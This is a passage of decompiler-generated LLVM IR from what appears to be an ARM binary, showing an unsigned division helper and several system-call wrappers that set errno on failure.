  uselistorder i32 %v0_10600, { 1, 2, 3, 0 }
  uselistorder i32 %v0_105e0, { 2, 0, 1, 3, 4, 5 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_10584, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 9, 10, 11, 12 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1064c, { 1, 0 }
  uselistorder label %dec_label_pc_1063c, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_105a8, { 2, 1, 0 }
}

define i32 @function_1067c() local_unnamed_addr {
dec_label_pc_1067c:
  %r2.global-to-local = alloca i32, align 4
  %v0_1067c = load i32, i32* @r1, align 4
  %v1_1067c = add i32 %v0_1067c, -1
  store i32 %v1_1067c, i32* %r2.global-to-local, align 4
  %v2_1067c = icmp eq i32 %v0_1067c, 0
  %v7_1067c = icmp eq i32 %v0_1067c, 1
  %v0_10680 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_1067c, i32 %v0_10680)
  br i1 %v2_1067c, label %dec_label_pc_10764, label %dec_label_pc_10688

dec_label_pc_10688:                               ; preds = %dec_label_pc_1067c
  %v0_10688 = load i32, i32* @r0, align 4
  %v1_10688 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_10688, %v1_10688
  br i1 %tmp, label %dec_label_pc_10690, label %dec_label_pc_1071c

dec_label_pc_10690:                               ; preds = %dec_label_pc_10688
  %v1_10690 = load i32, i32* %r2.global-to-local, align 4
  %v2_10690 = and i32 %v1_10690, %v1_10688
  %v4_10690 = icmp eq i32 %v2_10690, 0
  br i1 %v4_10690, label %dec_label_pc_10728, label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %dec_label_pc_10690
  %v3_10698 = icmp ult i32 %v1_10688, 536870912
  br i1 %v3_10698, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_10698
  %v4_1069c = mul i32 %v1_10688, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_10698, %.thread
  %v0_106bc.pr36.ph = phi i32 [ %v4_1069c, %.thread ], [ %v1_10688, %dec_label_pc_10698 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_10698 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_106bc.pr36 = phi i32 [ %v4_106b0, %bb81 ], [ %v0_106bc.pr36.ph, %.preheader.preheader ]
  %v1_106b4 = phi i32 [ %v4_106b4, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_106a8 = icmp ugt i32 %v0_106bc.pr36, 268435455
  br i1 %v2_106a8, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_106bcthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_106ac = icmp ult i32 %v0_106bc.pr36, %v0_10688
  br i1 %v4_106ac, label %bb80, label %dec_label_pc_106bcthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_106b0 = and i32 %v0_106bc.pr36, 268435456
  %v3_106b0 = icmp eq i32 %v2_106b0, 0
  %v4_106b0 = mul i32 %v0_106bc.pr36, 16
  br i1 %v3_106b0, label %bb81, label %dec_label_pc_106bc.loopexit

bb81:                                             ; preds = %bb80
  %v2_106b4 = and i32 %v1_106b4, 268435456
  %v3_106b4 = icmp eq i32 %v2_106b4, 0
  %v4_106b4 = mul i32 %v1_106b4, 16
  br i1 %v3_106b4, label %.preheader, label %dec_label_pc_106bcthread-pre-split.loopexit.loopexit

dec_label_pc_106bcthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_106c848.ph = phi i32 [ %v1_106b4, %bb ], [ %v4_106b4, %bb81 ]
  %v0_106bc.pr38.ph = phi i32 [ %v0_106bc.pr36, %bb ], [ %v4_106b0, %bb81 ]
  br label %dec_label_pc_106bcthread-pre-split.loopexit

dec_label_pc_106bcthread-pre-split.loopexit:      ; preds = %dec_label_pc_106bcthread-pre-split.loopexit.loopexit, %.thread2
  %v1_106c848 = phi i32 [ %v1_106b4, %.thread2 ], [ %v1_106c848.ph, %dec_label_pc_106bcthread-pre-split.loopexit.loopexit ]
  %v0_106bc.pr38 = phi i32 [ %v0_106bc.pr36, %.thread2 ], [ %v0_106bc.pr38.ph, %dec_label_pc_106bcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_106bcthread-pre-split

dec_label_pc_106bcthread-pre-split:               ; preds = %dec_label_pc_106bcthread-pre-split.loopexit, %bb83
  %v1_106c846 = phi i32 [ %v1_106c848, %dec_label_pc_106bcthread-pre-split.loopexit ], [ %v3_106c8, %bb83 ]
  %v0_106bc.pr = phi i32 [ %v0_106bc.pr38, %dec_label_pc_106bcthread-pre-split.loopexit ], [ %v3_106c4, %bb83 ]
  br label %dec_label_pc_106bc

dec_label_pc_106bc.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_106bc

dec_label_pc_106bc:                               ; preds = %dec_label_pc_106bc.loopexit, %dec_label_pc_106bcthread-pre-split
  %v1_106c8 = phi i32 [ %v1_106c846, %dec_label_pc_106bcthread-pre-split ], [ %v1_106b4, %dec_label_pc_106bc.loopexit ]
  %v1_106c4 = phi i32 [ %v0_106bc.pr, %dec_label_pc_106bcthread-pre-split ], [ %v4_106b0, %dec_label_pc_106bc.loopexit ]
  %v2_106bc = icmp slt i32 %v1_106c4, 0
  br i1 %v2_106bc, label %dec_label_pc_106d0, label %bb82

bb82:                                             ; preds = %dec_label_pc_106bc
  %v4_106c0 = icmp ult i32 %v1_106c4, %v0_10688
  br i1 %v4_106c0, label %bb83, label %dec_label_pc_106d0

bb83:                                             ; preds = %bb82
  %v3_106c4 = mul i32 %v1_106c4, 2
  %v2_106c8 = icmp slt i32 %v1_106c8, 0
  %v3_106c8 = mul i32 %v1_106c8, 2
  br i1 %v2_106c8, label %dec_label_pc_106d0, label %dec_label_pc_106bcthread-pre-split

dec_label_pc_106d0:                               ; preds = %bb82, %dec_label_pc_106bc, %bb83
  %v2_106dc59 = phi i32 [ %v3_106c8, %bb83 ], [ %v1_106c8, %bb82 ], [ %v1_106c8, %dec_label_pc_106bc ]
  %v1_106d451 = phi i32 [ %v3_106c4, %bb83 ], [ %v1_106c4, %bb82 ], [ %v1_106c4, %dec_label_pc_106bc ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_106d4

dec_label_pc_106d4:                               ; preds = %.thread11, %dec_label_pc_106d0
  %v1_10708 = phi i32 [ %v4_10708, %.thread11 ], [ %v2_106dc59, %dec_label_pc_106d0 ]
  %v1_106dc = phi i32 [ %v0_10714, %.thread11 ], [ 0, %dec_label_pc_106d0 ]
  %v1_1070c = phi i32 [ %v4_1070c, %.thread11 ], [ %v1_106d451, %dec_label_pc_106d0 ]
  %v1_106d8 = phi i32 [ %v0_10704, %.thread11 ], [ %v0_10688, %dec_label_pc_106d0 ]
  %v3_106d4 = icmp ult i32 %v1_106d8, %v1_1070c
  br i1 %v3_106d4, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_106d4
  %v3_106d8 = sub i32 %v1_106d8, %v1_1070c
  %v3_106dc = or i32 %v1_106dc, %v1_10708
  store i32 %v3_106dc, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_106d4, %bb84
  %v1_106e4 = phi i32 [ %v1_106d8, %dec_label_pc_106d4 ], [ %v3_106d8, %bb84 ]
  %v1_106e8 = phi i32 [ %v1_106dc, %dec_label_pc_106d4 ], [ %v3_106dc, %bb84 ]
  %v4_106e0 = udiv i32 %v1_1070c, 2
  %v6_106e0 = icmp ult i32 %v1_106e4, %v4_106e0
  br i1 %v6_106e0, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_106e4 = urem i32 %v1_1070c, 2
  %v4_106e4 = icmp eq i32 %v3_106e4, 0
  %v6_106e4 = sub i32 %v1_106e4, %v4_106e0
  br i1 %v4_106e4, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_106e8 = udiv i32 %v1_10708, 2
  %v6_106e8 = or i32 %v1_106e8, %v5_106e8
  store i32 %v6_106e8, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_106f0 = phi i32 [ %v6_106e4, %bb85 ], [ %v1_106e4, %.thread7 ], [ %v6_106e4, %bb86 ]
  %v1_106f4 = phi i32 [ %v1_106e8, %bb85 ], [ %v1_106e8, %.thread7 ], [ %v6_106e8, %bb86 ]
  %v4_106ec = udiv i32 %v1_1070c, 4
  %v6_106ec = icmp ult i32 %v1_106f0, %v4_106ec
  br i1 %v6_106ec, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_106f0 = and i32 %v1_1070c, 2
  %v4_106f0 = icmp eq i32 %v3_106f0, 0
  %v6_106f0 = sub i32 %v1_106f0, %v4_106ec
  br i1 %v4_106f0, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_106f4 = udiv i32 %v1_10708, 4
  %v6_106f4 = or i32 %v1_106f4, %v5_106f4
  store i32 %v6_106f4, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_106fc = phi i32 [ %v6_106f0, %bb87 ], [ %v1_106f0, %.thread8 ], [ %v6_106f0, %bb88 ]
  %v1_10700 = phi i32 [ %v1_106f4, %bb87 ], [ %v1_106f4, %.thread8 ], [ %v6_106f4, %bb88 ]
  %v4_106f8 = udiv i32 %v1_1070c, 8
  %v6_106f8 = icmp ult i32 %v1_106fc, %v4_106f8
  br i1 %v6_106f8, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_106fc = and i32 %v1_1070c, 4
  %v4_106fc = icmp eq i32 %v3_106fc, 0
  %v6_106fc = sub i32 %v1_106fc, %v4_106f8
  br i1 %v4_106fc, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_10700 = udiv i32 %v1_10708, 8
  %v6_10700 = or i32 %v1_10700, %v5_10700
  store i32 %v6_10700, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10714 = phi i32 [ %v1_10700, %bb89 ], [ %v1_10700, %.thread9 ], [ %v6_10700, %bb90 ]
  %v0_10704 = phi i32 [ %v6_106fc, %bb89 ], [ %v1_106fc, %.thread9 ], [ %v6_106fc, %bb90 ]
  %v2_10704 = icmp eq i32 %v0_10704, 0
  br i1 %v2_10704, label %dec_label_pc_10714, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10708, 16
  br i1 %tmp138, label %dec_label_pc_10714, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10708 = udiv i32 %v1_10708, 16
  %v4_1070c = udiv i32 %v1_1070c, 16
  br label %dec_label_pc_106d4

dec_label_pc_10714:                               ; preds = %thread-pre-split, %bb91
  ret i32 %v0_10714

dec_label_pc_1071c:                               ; preds = %dec_label_pc_10688
  %v9_10688 = icmp eq i32 %v0_10688, %v1_10688
  %. = zext i1 %v9_10688 to i32
  ret i32 %.

dec_label_pc_10728:                               ; preds = %dec_label_pc_10690
  %v2_10728 = icmp ugt i32 %v1_10688, 65535
  br i1 %v2_10728, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10728
  %v2_1072c = and i32 %v1_10688, 32768
  %v3_1072c = icmp eq i32 %v2_1072c, 0
  %v4_1072c = udiv i32 %v1_10688, 65536
  br i1 %v3_1072c, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10728
  %v0_1073865 = phi i32 [ %v1_10688, %dec_label_pc_10728 ], [ %v4_1072c, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_1073c = phi i32 [ %v0_1073865, %.thread16 ], [ %v4_1072c, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10738 = icmp ugt i32 %v1_1073c, 255
  br i1 %v2_10738, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_1073c = and i32 %v1_1073c, 128
  %v3_1073c = icmp eq i32 %v2_1073c, 0
  %v4_1073c = udiv i32 %v1_1073c, 256
  br i1 %v3_1073c, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10740 = or i32 %storemerge, 8
  store i32 %v2_10740, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_1074c = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10740, %bb98 ]
  %v1_10748 = phi i32 [ %v1_1073c, %bb96 ], [ %v4_1073c, %bb97 ], [ %v4_1073c, %bb98 ]
  %v2_10744 = icmp ugt i32 %v1_10748, 15
  br i1 %v2_10744, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10748 = and i32 %v1_10748, 8
  %v3_10748 = icmp eq i32 %v2_10748, 0
  %v4_10748 = udiv i32 %v1_10748, 16
  br i1 %v3_10748, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1074c = add nsw i32 %v1_1074c, 4
  store i32 %v2_1074c, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10754 = phi i32 [ %v1_1074c, %.thread17 ], [ %v1_1074c, %bb99 ], [ %v2_1074c, %bb100 ]
  %v5_10758 = phi i32 [ %v1_10748, %.thread17 ], [ %v4_10748, %bb99 ], [ %v4_10748, %bb100 ]
  %v2_10750 = icmp ugt i32 %v5_10758, 3
  %v7_10750 = icmp eq i32 %v5_10758, 4
  %v2_10754 = xor i1 %v7_10750, true
  %v3_10754 = and i1 %v2_10750, %v2_10754
  br i1 %v3_10754, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10754 = add nsw i32 %v4_10754, 3
  store i32 %v5_10754, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10758 = phi i32 [ %v4_10754, %.thread18 ], [ %v5_10754, %bb101 ]
  %v2_10758 = xor i1 %v2_10750, true
  %v3_10758 = or i1 %v7_10750, %v2_10758
  br i1 %v3_10758, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10758 = udiv i32 %v5_10758, 2
  %v9_10758 = add i32 %v4_10758, %v8_10758
  store i32 %v9_10758, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_1075c = phi i32 [ %v4_10758, %bb102 ], [ %v9_10758, %bb103 ]
  %v6_1075c = lshr i32 %v0_10688, %v1_1075c
  ret i32 %v6_1075c

dec_label_pc_10764:                               ; preds = %dec_label_pc_1067c
  %v0_10764 = load i32, i32* @lr, align 4
  %v0_10768 = call i32 @function_10790()
  store i32 %v0_10764, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10758, { 1, 0 }
  uselistorder i1 %v7_10750, { 1, 0 }
  uselistorder i32 %v4_10748, { 1, 0 }
  uselistorder i32 %v1_10748, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10740, { 1, 0 }
  uselistorder i32 %v4_1073c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1073c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1072c, { 1, 0 }
  uselistorder i32 %v0_10704, { 1, 0 }
  uselistorder i32 %v4_106f8, { 1, 0 }
  uselistorder i32 %v1_10700, { 1, 2, 0 }
  uselistorder i32 %v4_106ec, { 1, 0 }
  uselistorder i32 %v1_106f4, { 1, 2, 0 }
  uselistorder i32 %v4_106e0, { 1, 0 }
  uselistorder i32 %v1_106e8, { 1, 2, 0 }
  uselistorder i32 %v1_1070c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_106dc, { 1, 0 }
  uselistorder i32 %v1_10708, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_106c8, { 1, 0 }
  uselistorder i32 %v3_106c4, { 1, 0 }
  uselistorder i32 %v1_106c4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_106c8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_106b4, { 1, 0 }
  uselistorder i32 %v4_106b0, { 2, 1, 0 }
  uselistorder i32 %v1_106b4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_106bc.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_10688, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_10688, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_1067c, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10714, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_106d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_106bcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_10778(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10778:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_1077c = call i32 @function_1067c()
  ret i32 %v0_1077c
}

define i32 @function_10790() local_unnamed_addr {
dec_label_pc_10790:
  %v1_10798 = call i32 @function_113f4(i32 8)
  ret i32 %v1_10798
}

define i32 @function_107a4() local_unnamed_addr {
dec_label_pc_107a4:
  %v1_107b4 = load i32, i32* @r0, align 4
  ret i32 %v1_107b4
}

define i32 @function_107b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_107b8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107b8 = load i32, i32* @r7, align 4
  store i32 %v3_107b8, i32* %stack_var_-8, align 4
  %v0_107c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_107c4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107c4, -4095
  br i1 %tmp, label %dec_label_pc_107e4, label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %dec_label_pc_107b8
  %v0_107d4 = call i32 @function_11008()
  %v0_107d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_107d8 = sub i32 0, %v0_107d8
  %v2_107dc = inttoptr i32 %v0_107d4 to i32*
  store i32 %v1_107d8, i32* %v2_107dc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_107e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_107e4

dec_label_pc_107e4:                               ; preds = %dec_label_pc_107b8, %dec_label_pc_107d4
  %v1_107e8 = phi i32 [ %v0_107c4, %dec_label_pc_107b8 ], [ -1, %dec_label_pc_107d4 ]
  %v2_107e4 = phi i32 [ %v3_107b8, %dec_label_pc_107b8 ], [ %v2_107e4.pre, %dec_label_pc_107d4 ]
  store i32 %v2_107e4, i32* @r7, align 4
  ret i32 %v1_107e8

; uselistorder directives
  uselistorder i32 %v0_107c4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_107e4, { 1, 0 }
}

define i32 @function_107ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_107ec:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_107ec = load i32, i32* @r2, align 4
  %v9_107ec = load i32, i32* @r3, align 4
  store i32 %v9_107ec, i32* %stack_var_-4, align 4
  %v1_107fc = and i32 %arg2, 64
  %v2_107fc = icmp eq i32 %v1_107fc, 0
  br i1 %v2_107fc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_107ec
  %v3_10804 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_10804, i32* @r3, align 4
  %phitmp = urem i32 %v6_107ec, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_107ec, %bb
  %v0_10808 = phi i32 [ 0, %dec_label_pc_107ec ], [ %phitmp, %bb ]
  store i32 %v0_10808, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10838, label %dec_label_pc_10828

dec_label_pc_10828:                               ; preds = %.thread
  %v0_10828 = call i32 @function_11008()
  %v0_1082c = load i32, i32* %r7.global-to-local, align 4
  %v1_1082c = sub i32 0, %v0_1082c
  store i32 %v1_1082c, i32* @r3, align 4
  %v2_10830 = inttoptr i32 %v0_10828 to i32*
  store i32 %v1_1082c, i32* %v2_10830, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %.thread, %dec_label_pc_10828
  %v0_10838 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_10828 ]
  ret i32 %v0_10838

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10838, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1084c() local_unnamed_addr {
dec_label_pc_1084c:
  %v1_1085c = load i32, i32* @r0, align 4
  ret i32 %v1_1085c
}

define i32 @function_10860(i32* %arg1) local_unnamed_addr {
dec_label_pc_10860:
  %stack_var_-16 = alloca i32, align 4
  %v2_10864 = ptrtoint i32* %stack_var_-16 to i32
  %v2_10874 = call i32 @function_109e0(i32 %v2_10864, i32 0)
  %v2_10878 = load i32, i32* %stack_var_-16, align 4
  %v2_1087c = icmp eq i32* %arg1, null
  br i1 %v2_1087c, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_10860
  store i32 %v2_10878, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_10860, %bb
  ret i32 %v2_10878

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_10890(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10890:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_108c4, label %dec_label_pc_108b4

dec_label_pc_108b4:                               ; preds = %dec_label_pc_10890
  %v0_108b4 = call i32 @function_11008()
  %v0_108b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_108b8 = sub i32 0, %v0_108b8
  %v2_108bc = inttoptr i32 %v0_108b4 to i32*
  store i32 %v1_108b8, i32* %v2_108bc, align 4
  br label %dec_label_pc_108c4

dec_label_pc_108c4:                               ; preds = %dec_label_pc_10890, %dec_label_pc_108b4
  %v1_108cc = phi i32 [ %arg1, %dec_label_pc_10890 ], [ -1, %dec_label_pc_108b4 ]
  ret i32 %v1_108cc

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108c4, { 1, 0 }
}

define i32 @function_108d0() local_unnamed_addr {
dec_label_pc_108d0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_108d0 = load i32, i32* @r7, align 4
  store i32 %v3_108d0, i32* %stack_var_-8, align 4
  %v0_108dc = load i32, i32* @r0, align 4
  store i32 %v0_108dc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_108dc, -4095
  br i1 %tmp, label %dec_label_pc_108fc, label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108d0
  %v0_108ec = call i32 @function_11008()
  %v0_108f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_108f0 = sub i32 0, %v0_108f0
  %v2_108f4 = inttoptr i32 %v0_108ec to i32*
  store i32 %v1_108f0, i32* %v2_108f4, align 4
  %v2_108fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108d0, %dec_label_pc_108ec
  %v1_10900 = phi i32 [ %v0_108dc, %dec_label_pc_108d0 ], [ -1, %dec_label_pc_108ec ]
  %v2_108fc = phi i32 [ %v3_108d0, %dec_label_pc_108d0 ], [ %v2_108fc.pre, %dec_label_pc_108ec ]
  store i32 %v2_108fc, i32* @r7, align 4
  ret i32 %v1_10900

; uselistorder directives
  uselistorder i32 %v0_108dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_108fc, { 1, 0 }
}

define i32 @function_10904(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10904:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10934, label %dec_label_pc_10924

dec_label_pc_10924:                               ; preds = %dec_label_pc_10904
  %v0_10924 = call i32 @function_11008()
  %v0_10928 = load i32, i32* %r4.global-to-local, align 4
  %v1_10928 = sub i32 0, %v0_10928
  %v2_1092c = inttoptr i32 %v0_10924 to i32*
  store i32 %v1_10928, i32* %v2_1092c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10934

dec_label_pc_10934:                               ; preds = %dec_label_pc_10904, %dec_label_pc_10924
  %v0_10934 = phi i32 [ %arg1, %dec_label_pc_10904 ], [ -1, %dec_label_pc_10924 ]
  ret i32 %v0_10934

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10934, { 1, 0 }
}

define i32 @function_10944(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10944:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10944 = load i32, i32* @r7, align 4
  store i32 %v3_10944, i32* %stack_var_-8, align 4
  %v0_10950 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10950, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10950, -4095
  br i1 %tmp, label %dec_label_pc_10970, label %dec_label_pc_10960

dec_label_pc_10960:                               ; preds = %dec_label_pc_10944
  %v0_10960 = call i32 @function_11008()
  %v0_10964 = load i32, i32* %r7.global-to-local, align 4
  %v1_10964 = sub i32 0, %v0_10964
  store i32 %v1_10964, i32* @r3, align 4
  %v2_10968 = inttoptr i32 %v0_10960 to i32*
  store i32 %v1_10964, i32* %v2_10968, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10970.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10970

dec_label_pc_10970:                               ; preds = %dec_label_pc_10944, %dec_label_pc_10960
  %v1_10974 = phi i32 [ %v0_10950, %dec_label_pc_10944 ], [ -1, %dec_label_pc_10960 ]
  %v2_10970 = phi i32 [ %v3_10944, %dec_label_pc_10944 ], [ %v2_10970.pre, %dec_label_pc_10960 ]
  store i32 %v2_10970, i32* @r7, align 4
  ret i32 %v1_10974

; uselistorder directives
  uselistorder i32 %v0_10950, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10970, { 1, 0 }
}

define i32 @function_10978(i32 %arg1) local_unnamed_addr {
dec_label_pc_10978:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10978 = load i32, i32* @r7, align 4
  store i32 %v3_10978, i32* %stack_var_-8, align 4
  %v0_10984 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10984, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10984, -4095
  br i1 %tmp, label %dec_label_pc_109a4, label %dec_label_pc_10994

dec_label_pc_10994:                               ; preds = %dec_label_pc_10978
  %v0_10994 = call i32 @function_11008()
  %v0_10998 = load i32, i32* %r7.global-to-local, align 4
  %v1_10998 = sub i32 0, %v0_10998
  %v2_1099c = inttoptr i32 %v0_10994 to i32*
  store i32 %v1_10998, i32* %v2_1099c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_109a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_109a4

dec_label_pc_109a4:                               ; preds = %dec_label_pc_10978, %dec_label_pc_10994
